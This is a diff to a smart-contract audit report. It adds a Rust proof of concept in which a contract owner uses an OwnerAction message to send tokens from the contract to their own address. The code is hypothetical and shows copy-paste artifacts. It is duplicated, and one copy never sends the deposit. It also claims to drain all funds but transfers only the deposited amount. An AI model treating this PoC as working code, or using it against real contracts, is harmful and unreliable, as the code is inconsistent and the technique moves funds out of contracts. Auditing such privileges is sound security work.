@@ -394,8 +394,71 @@ Ok(Response::new().add_attribute("action", "execute_action").add_message(propose
 
 ### Proof of concept
 
+Here's how the contract owner could potentially drain all the funds:
+
+rust
+Copy code
+// Assume the contract is deployed and the address is `contract_address`
+// The owner's address is `owner_address`
+// We're using a hypothetical Cosmos SDK client library for this example
+
+let client = CosmosClient::new(/_ parameters such as node URL, chain ID, etc. _/);
+let contract_address = "cosmos1contractaddress123";
+let owner_address = "cosmos1owneraddress123";
+
+// Step 1: Owner deposits a significant amount of uawesome tokens into the contract
+let deposit_amount = 10000; // uawesome tokens
+let deposit_msg = ExecuteMsg::Deposit {};
+let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
+contract_addr: contract_address.to_string(),
+msg: to_binary(&deposit_msg).unwrap(),
+funds: vec![coin(deposit_amount, DENOM)],
+});
+
+client.send(cosmos_msg, owner_address).await.unwrap();
+
+// Step 2: Owner uses the `OwnerAction` function to send a `BankMsg::Send` message,
+// transferring all the contract's balance to their own account
+
+let withdraw_msg = BankMsg::Send {
+to_address: owner_address.to_string(),
+amount: vec![coin(deposit_amount, DENOM)],
+};
+let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
+contract_addr: contract_address.to_string(),
+msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
+funds: vec![],
+});
+
+client.send(cosmos_msg, owner_address).await.unwrap();
+In this PoC code, the owner first deposits a large amount of uawesome tokens to the contract, then the owner sends a BankMsg::Send message via OwnerAction to transfer all the contract's balance to their own account.
+
+Remember, this is just a demonstration of how the owner of the contract can drain the contract. This action might be considered malicious in a real-world scenario and it's generally not a good practice to have such powerful capabilities in a smart contract.
+
 ```rust
-// code goes here
+let client = CosmosClient::new(/* parameters such as node URL, chain ID, etc. */);
+let contract_address = "cosmos1contractaddress123";
+let owner_address = "cosmos1owneraddress123";
+
+let deposit_amount = 10000; // uawesome tokens
+let deposit_msg = ExecuteMsg::Deposit {};
+let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
+    contract_addr: contract_address.to_string(),
+    msg: to_binary(&deposit_msg).unwrap(),
+    funds: vec![coin(deposit_amount, DENOM)],
+});
+
+let withdraw_msg = BankMsg::Send {
+    to_address: owner_address.to_string(),
+    amount: vec![coin(deposit_amount, DENOM)],
+};
+let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
+    contract_addr: contract_address.to_string(),
+    msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
+    funds: vec![],
+});
+
+client.send(cosmos_msg, owner_address).await.unwrap();
 ```
 
 ---
